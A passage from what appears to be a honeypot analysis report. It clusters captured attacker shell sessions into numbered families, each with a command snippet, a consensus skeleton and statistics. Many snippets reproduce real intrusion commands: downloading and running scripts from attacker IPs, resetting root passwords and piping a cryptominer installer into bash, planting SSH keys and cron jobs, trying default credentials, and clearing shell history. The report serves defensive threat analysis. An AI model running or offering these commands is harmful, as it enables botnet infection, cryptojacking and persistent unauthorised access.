| de9023b830d6224a | a170f51c12d7 |        1 |               1 |
| e45b61ce13ad7a81 | a0786a80d975 |        1 |               1 |

---

## Family 142

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.958 (±0.000)
- **Medoid Archetype**: `090ffe33369a091f` (Session: `472516819483`, n_rows=6)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /sys || cd /bin || cd /mnt || cd /root || cd /
wget http://109.104.151.108/mtr.sh
chmod +x mtr.sh
sh mtr.sh
rm -rf mtr.sh
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 14), ('wget', 2), ('chmod', 2), ('rm', 2), ('history', 2), ('sh', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 090ffe33369a091f | 472516819483 |        6 |               1 |
| 882de8cc6c396de7 | 517ac458f07d |        6 |               1 |

---

## Family 31

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.947 (±0.000)
- **Medoid Archetype**: `a992dcfa4bd2592b` (Session: `a90084b0e522`, n_rows=18)

**Medoid Execution Snippet:**
```text
enable
development
system
shell
sh
runshellcmd
linuxshell
runshellcmd
start start-shell
start-shell
start-shell bash
ping
sh
vshell
exec shellconfig
config terminal
busybox DNXFCOW
/bin/busybox DNXFCOW ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('development', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('runshellcmd', ';'), ('linuxshell', ';'), ('runshellcmd', ';'), ('start', ';'), ('start-shell', ';'), ('start-shell', ';'), ('ping', ';'), ('sh', ';'), ('vshell', ';'), ('exec', ';'), ('config', ';'), ('busybox', ';'), ('busybox', 'EOS')]`

Top operators: [('busybox', 5), ('sh', 4), ('runshellcmd', 4), ('start-shell', 4), ('enable', 2), ('development', 2), ('system', 2), ('shell', 2), ('linuxshell', 2), ('start', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a992dcfa4bd2592b | a90084b0e522 |       18 |               1 |
| af70f1781e990006 | 3c0611888c97 |       19 |               1 |

---

## Family 134

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.929 (±0.000)
- **Medoid Archetype**: `98b1fd1344b4ce8a` (Session: `15ecf5b55ebf`, n_rows=7)

**Medoid Execution Snippet:**
```text
sh
cd /tmp
wget http://51.222.56.159/bin.sh
curl http://51.222.56.159/bin.sh -o bin.sh
chmod +x  bin.sh
./bin.sh
rm bin.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_2', ';'), ('rm', 'EOS')]`

Top operators: [('sh', 2), ('cd', 2), ('wget', 2), ('curl', 2), ('chmod', 2), ('PH_EXEC_2', 2), ('rm', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 98b1fd1344b4ce8a | 15ecf5b55ebf |        7 |               1 |
| d783cec20b26e80d | 9c9e945c8541 |        6 |               1 |

---

## Family 82

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.909 (±0.000)
- **Medoid Archetype**: `dfc00c00617a91c7` (Session: `078ace32402c`, n_rows=5)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp73JmN6TcPu ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('crontab', ';'), ('chmod', ';'), ('chmod', ';'), ('useradd', 'EOS')]`

Top operators: [('chmod', 6), ('cd', 4), ('rm', 2), ('mkdir', 2), ('echo', 2), ('crontab', 2), ('useradd', 2), ('userdel', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| dfc00c00617a91c7 | 078ace32402c |        5 |               1 |
| f7716de87b7f40be | 1c60f57bf65f |        6 |               1 |

---

## Family 117

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.905 (±0.000)
- **Medoid Archetype**: `2bac59d3b6e1d12b` (Session: `e832135349ff`, n_rows=63)

**Medoid Execution Snippet:**
```text
enable
shell
sh
busybox ECCHI
busybox ps
busybox ECCHI
busybox cat /proc/mounts
busybox ECCHI
busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
busybox cat /.nippon
busybox rm /.nippon
busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon
busybox cat /sys/.nippon
busybox rm /sys/.nippon
busybox echo -e  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('shell', ';'), ('sh', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('cd', ';'), ('>', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', 'EOS')]`

Top operators: [('busybox', 108), ('rm', 5), ('enable', 2), ('shell', 2), ('sh', 2), ('cd', 2), ('>', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2bac59d3b6e1d12b | e832135349ff |       63 |               1 |
| a30074efcac3ca6b | e7f6fd8a82ea |       60 |               1 |

---

## Family 121

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.900 (±0.000)
- **Medoid Archetype**: `557c63705f6b286c` (Session: `64c7238e905d`, n_rows=2)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|')]`

Top operators: [('cd', 4), ('rm', 2), ('mkdir', 2), ('echo', 2), ('chmod', 2), ('cat', 2), ('grep', 2), ('wc', 2), ('head', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 557c63705f6b286c | 64c7238e905d |        2 |               1 |
| dc1d34fa7358d80a | cecfbdbb39ed |        2 |               1 |

---

## Family 35

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.889 (±0.000)
- **Medoid Archetype**: `0c653968b6f37689` (Session: `cc509840eb3c`, n_rows=7)

**Medoid Execution Snippet:**
```text
/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/* ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('ifconfig', ';'), ('uname', ';'), ('cat', ';'), ('ps', '|'), ('grep', ';'), ('ps', '|')]`

Top operators: [('ps', 4), ('grep', 4), ('PH_EXEC_1', 2), ('ifconfig', 2), ('uname', 2), ('cat', 2), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0c653968b6f37689 | cc509840eb3c |        7 |               1 |
| 1e8b6eae1b4e6a4d | d647e8ef5fab |        6 |               1 |

---

## Family 60

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.889 (±0.000)
- **Medoid Archetype**: `522b6a9bdfb0ac68` (Session: `3dc4e6cd567d`, n_rows=23)

**Medoid Execution Snippet:**
```text
sh
shell
enable
linuxshell
system
help
busybox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://109.104.151.108/0x83911d24Fx.sh
curl -O http://109.104.151.108/0x83911d24Fx.sh
chmod 777 0x83911d24Fx.sh
sh 0x83911d24Fx.sh
tftp 109.104.151.108 -c get 0xt984767.sh
chmod 777 0xft6426467. ...
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('enable', ';'), ('linuxshell', ';'), ('system', ';'), ('help', ';'), ('busybox', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 10), ('sh', 9), ('chmod', 6), ('tftp', 4), ('rm', 3), ('shell', 2), ('enable', 2), ('linuxshell', 2), ('system', 2), ('help', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 522b6a9bdfb0ac68 | 3dc4e6cd567d |       23 |               1 |
| d697045613f30f48 | 34cafbcbe908 |       20 |               1 |

---

## Family 66

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.882 (±0.000)
- **Medoid Archetype**: `8339972d3d83132e` (Session: `3b437504f969`, n_rows=9)

**Medoid Execution Snippet:**
```text
start
enable
config terminal
system
linuxshell
su
shell
sh
cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('start', ';'), ('enable', ';'), ('config', ';'), ('system', ';'), ('linuxshell', ';'), ('su', ';'), ('shell', ';'), ('sh', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('busybox', 'EOS')]`

Top operators: [('cd', 12), ('busybox', 4), ('start', 2), ('enable', 2), ('config', 2), ('system', 2), ('linuxshell', 2), ('su', 2), ('shell', 2), ('sh', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 8339972d3d83132e | 3b437504f969 |        9 |               1 |
| f589acee7a69df29 | aba33e52f825 |       10 |               1 |

---

## Family 74

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.875 (±0.000)
- **Medoid Archetype**: `0ddbc0b7de37948a` (Session: `a33ee0a00a08`, n_rows=4)

**Medoid Execution Snippet:**
```text
wget https://www.nasapaul.com/ninfo
curl -O https://www.nasapaul.com/ninfo
chmod 777 *
./ninfo ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]`

Top operators: [('wget', 2), ('chmod', 2), ('PH_EXEC_1', 2), ('curl', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0ddbc0b7de37948a | a33ee0a00a08 |        4 |               1 |
| 2fe0a2619ff2763b | 866d8d73a6ed |        4 |               1 |

---

## Family 90

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.875 (±0.000)
- **Medoid Archetype**: `872721baad8b7e72` (Session: `e20a8c4231bf`, n_rows=21)

**Medoid Execution Snippet:**
```text
admin
admn
echo infectednight loader\n
administrator
password
echo infectednight loader\n
admin
4321
echo infectednight loader\n
guest
12345
echo infectednight loader\n
guest
1234
echo infectednight loader\n
user
password
echo infectednight loader\n
admin
1234
echo infectednight loader\n ;
```

**Consensus Skeleton (op, conn pairs):**
`[('admin', ';'), ('admn', ';'), ('echo', ';'), ('administrator', ';'), ('password', ';'), ('echo', ';'), ('admin', ';'), ('4321', ';'), ('echo', ';'), ('guest', ';'), ('12345', ';'), ('echo', ';'), ('guest', ';'), ('1234', ';'), ('echo', ';'), ('user', ';'), ('password', ';'), ('echo', ';'), ('admin', ';'), ('1234', ';'), ('echo', 'EOS')]`

Top operators: [('echo', 15), ('admin', 8), ('password', 4), ('guest', 4), ('1234', 4), ('admn', 2), ('administrator', 2), ('4321', 2), ('12345', 2), ('user', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 872721baad8b7e72 | e20a8c4231bf |       21 |               1 |
| d67b065062c31d27 | f771d7fbaba7 |       24 |               1 |

---

## Family 100

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.857 (±0.000)
- **Medoid Archetype**: `1bf43f8e52f8a245` (Session: `0d89e8f7dce0`, n_rows=11)

**Medoid Execution Snippet:**
```text
echo root:storytimeababyj23it345uig3jrhju345h | chpasswd | bash
pkill java
pkill ntpd
pkill screen
pkill zhh
pkill xmrig
pkill cnrig
pkill x86
echo 1
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vR ...
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('curl', '|')]`

Top operators: [('kill', 14), ('echo', 4), ('bash', 4), ('chpasswd', 2), ('curl', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1bf43f8e52f8a245 | 0d89e8f7dce0 |       11 |               1 |
| 794adbb82ea9a549 | 00f0a170f2a5 |        9 |               1 |

---

## Family 98

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.857 (±0.000)
- **Medoid Archetype**: `20584d4c4537b034` (Session: `fe1e4eda8a7b`, n_rows=3)

**Medoid Execution Snippet:**
```text
whoami
lscpu | grep Model
df -h | head -n 2 | awk 'FNR == 2 {print $2;}' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('whoami', ';'), ('lscpu', '|'), ('grep', ';'), ('df', '|'), ('head', '|'), ('awk', 'EOS')]`

Top operators: [('whoami', 2), ('lscpu', 2), ('grep', 2), ('df', 2), ('head', 2), ('awk', 2), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 20584d4c4537b034 | fe1e4eda8a7b |        3 |               1 |
| 708294f30ceaa7f2 | c6419ce5781d |        4 |               1 |

---

## Family 126

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.857 (±0.000)
- **Medoid Archetype**: `278875e303567046` (Session: `67bd770345c9`, n_rows=7)

**Medoid Execution Snippet:**
```text
enable
sh
shell
linuxshell
system
ls /home
/bin/busybox CORONA ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('sh', ';'), ('shell', ';'), ('linuxshell', ';'), ('system', ';'), ('busybox', 'EOS')]`

Top operators: [('enable', 2), ('sh', 2), ('shell', 2), ('linuxshell', 2), ('system', 2), ('busybox', 2), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 278875e303567046 | 67bd770345c9 |        7 |               1 |
| 7d123ab8b811efee | db8ac19afbaf |        6 |               1 |

---

## Family 49

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.850 (±0.000)
- **Medoid Archetype**: `7bb781c9ce6187ac` (Session: `032a8713e561`, n_rows=10)

**Medoid Execution Snippet:**
```text
enable
admin
system
sh
/bin/busybox gay
echo -en "\x6d\x69\x6e\x65\x72\x77\x6f\x72\x64"
ls /home
ps aux
/bin/busybox gay
echo -en "\x6d\x69\x6e\x65\x72\x77\x6f\x72\x64" ;
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('sh', ';'), ('busybox', ';'), ('echo', ';'), ('ls', ';'), ('ps', ';'), ('busybox', ';'), ('echo', 'EOS')]`

Top operators: [('busybox', 4), ('echo', 4), ('enable', 2), ('sh', 2), ('ls', 2), ('ps', 2), ('admin', 1), ('system', 1), ('development', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7bb781c9ce6187ac | 032a8713e561 |       10 |               1 |
| a0deb9d49f3d5dbf | 90329bf0e997 |        9 |               1 |

---

## Family 92

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.833 (±0.000)
- **Medoid Archetype**: `5890df478179b66e` (Session: `0492882ba3d1`, n_rows=5)

**Medoid Execution Snippet:**
```text
uname -a
wget ftp://cpa:cpa@5.45.119.175/znoki.jpg
perl znoki.jpg
rm -rf zn*
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('wget', ';'), ('perl', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('uname', 2), ('wget', 2), ('perl', 2), ('rm', 2), ('history', 2), ('nproc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5890df478179b66e | 0492882ba3d1 |        5 |               1 |
| d9b37ca74d92bc69 | e5825e54b70f |        4 |               1 |

---

## Family 157

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.833 (±0.000)
- **Medoid Archetype**: `5f2157051b5f8e60` (Session: `096b2b278955`, n_rows=8)

**Medoid Execution Snippet:**
```text
cd /tmp
wget http://179.43.175.5/ssh.sh
chmod 777 ssh.sh
sh ssh.sh
curl http://179.43.175.5/sshc.sh -o sshc.sh
chmod 777 sshc.sh
sh sshc.sh
rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('chmod', ';'), ('sh', ';')]`

Top operators: [('chmod', 4), ('sh', 4), ('cd', 2), ('wget', 2), ('rm', 2), ('curl', 1), ('tftp', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5f2157051b5f8e60 | 096b2b278955 |        8 |               1 |
| 665a60e5dec8601d | f2a02efbc0d2 |        9 |               1 |

---

## Family 153

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.833 (±0.000)
- **Medoid Archetype**: `92d83bd84799237e` (Session: `9822b0bc7c99`, n_rows=3)

**Medoid Execution Snippet:**
```text
shell
sh
cat /bin/busybox ;
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('sh', ';')]`

Top operators: [('shell', 2), ('sh', 2), ('cat', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 92d83bd84799237e | 9822b0bc7c99 |        3 |               1 |
| a6396d5cdc48f23b | 19bfa8a2301e |        3 |               1 |

---

## Family 40

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.833 (±0.000)
- **Medoid Archetype**: `9f5390e03017262a` (Session: `04ba8dd2cd68`, n_rows=3)

**Medoid Execution Snippet:**
```text
echo root:3G4gRrRrtD3 | chpasswd
uname -a
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 47v9mKikPcCZCq5mDn71ssWLDQ9UkrbiE2Tgu37BueHCHULTp5F6eHG1PA7X6o5RrW3tLjKVaCKrt23ATHn25hyy81iXQVL ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('uname', ';'), ('curl', '|'), ('bash', 'EOS')]`

Top operators: [('bash', 3), ('echo', 2), ('chpasswd', 2), ('uname', 2), ('curl', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9f5390e03017262a | 04ba8dd2cd68 |        3 |               1 |
| fdc5630b26bbda3d | 7c2c86cc9033 |        3 |               1 |

---

## Family 36

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.833 (±0.000)
- **Medoid Archetype**: `b9b6d7baebe84d92` (Session: `2bf1018d9f95`, n_rows=5)

**Medoid Execution Snippet:**
```text
echo Content-Type: text/plain
echo
(wget http://179.43.187.243/bins.sh
chmod +x bins.sh
sh bins.sh) ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', ';'), ('echo', ';')]`

Top operators: [('echo', 5), ('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b9b6d7baebe84d92 | 2bf1018d9f95 |        5 |               1 |
| f6df56b982b96e1e | 8a37dd541ad3 |        3 |               1 |

---

## Family 62

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.830 (±0.000)
- **Medoid Archetype**: `55625bbe59d92a2f` (Session: `7b987f1ab3a1`, n_rows=31)

**Medoid Execution Snippet:**
```text
development
linuxshell
..
sh
enable
system
bash
shell
terminal
watch 'sh'
/bin/busybox gay
echo -en "\x6d\x69\x6e\x65\x72\x77\x6f\x72\x64"
ls /home
ps aux
/bin/busybox gay
echo -en "\x6d\x69\x6e\x65\x72\x77\x6f\x72\x64"
>/tmp/.nigga && cd /tmp/
>/var/.nigga && cd /var/
>/dev/.nigga && cd /dev/
>/mnt ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('busybox', ';'), ('echo', ';'), ('ls', ';'), ('ps', ';'), ('busybox', ';'), ('echo', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('echo', 'EOS')]`

Top operators: [('>', 26), ('cd', 26), ('busybox', 6), ('echo', 6), ('sh', 2), ('enable', 2), ('system', 2), ('ls', 2), ('ps', 2), ('development', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 55625bbe59d92a2f | 7b987f1ab3a1 |       31 |               1 |
| f0fc319ee9fb54b6 | d61f016ed1f5 |       25 |               1 |

---

## Family 20

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.821 (±0.000)
- **Medoid Archetype**: `00f3c4d4847e2c15` (Session: `d00724e07578`, n_rows=15)

**Medoid Execution Snippet:**
```text
ls /
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://181.214.39.101/sora.sh
curl -O http://181.214.39.101/sora.sh
chmod 777 sora.sh
sh sora.sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
tftp 181.214.39.101 -c get sora.sh
chmod 777 sora.sh
sh sora.sh
tftp -r sora2.sh -g 1 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('ls', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('ftpget', ';'), ('sh', 'EOS')]`

Top operators: [('cd', 25), ('sh', 8), ('chmod', 6), ('tftp', 4), ('ls', 2), ('wget', 2), ('curl', 2), ('ftpget', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 00f3c4d4847e2c15 | d00724e07578 |       15 |               1 |
| a58de8a62945f150 | 221291f60404 |       16 |               1 |

---

## Family 94

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.800 (±0.000)
- **Medoid Archetype**: `1bcc563910960873` (Session: `4611ffb36c9b`, n_rows=4)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';')]`

Top operators: [('sh', 4), ('shell', 2), ('ls', 2), ('cd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1bcc563910960873 | 4611ffb36c9b |        4 |               1 |
| 5bb90cec037f2d80 | 304189bf62bd |        5 |               1 |

---

## Family 9

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.800 (±0.000)
- **Medoid Archetype**: `35307cf2a4723623` (Session: `8e6965c09619`, n_rows=5)

**Medoid Execution Snippet:**
```text
cat /bin/echo
>/tmp/.a && cd /tmp
>/dev/.a && cd /dev
wget http://2.58.149.116/spc -O- >.f
chmod 777 .f;./.f scan.wget.spc ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', 'EOS')]`

Top operators: [('cat', 4), ('>', 4), ('cd', 4), ('wget', 2), ('chmod', 2), ('PH_EXEC_1', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 35307cf2a4723623 | 8e6965c09619 |        5 |               1 |
| 5e36d23ed4ccbbe4 | bb0f1b613f7d |        5 |               1 |

---

## Family 24

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.800 (±0.000)
- **Medoid Archetype**: `626e125ae0a00181` (Session: `e5e433090e47`, n_rows=5)

**Medoid Execution Snippet:**
```text
start
enable
config terminal
system
linuxshell ;
```

**Consensus Skeleton (op, conn pairs):**
`[('start', ';'), ('enable', ';'), ('config', ';')]`

Top operators: [('start', 2), ('enable', 2), ('config', 2), ('system', 2), ('linuxshell', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 626e125ae0a00181 | e5e433090e47 |        5 |               1 |
| d3428bff41ce103e | 42abd08d953d |        4 |               1 |

---

## Family 54

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.786 (±0.000)
- **Medoid Archetype**: `0979b8ccb94d955a` (Session: `fed6d2464bd9`, n_rows=7)

**Medoid Execution Snippet:**
```text
cat /etc/issue
wget http://trdc.cc/x86_64
chmod 777 *
./x86_64 x86_w
curl -O http://trdc.cc/x86_64
chmod 777 *
./x86_64 x86_c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';')]`

Top operators: [('chmod', 3), ('PH_EXEC_1', 3), ('cat', 2), ('wget', 2), ('curl', 2), ('bash', 1), ('echo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
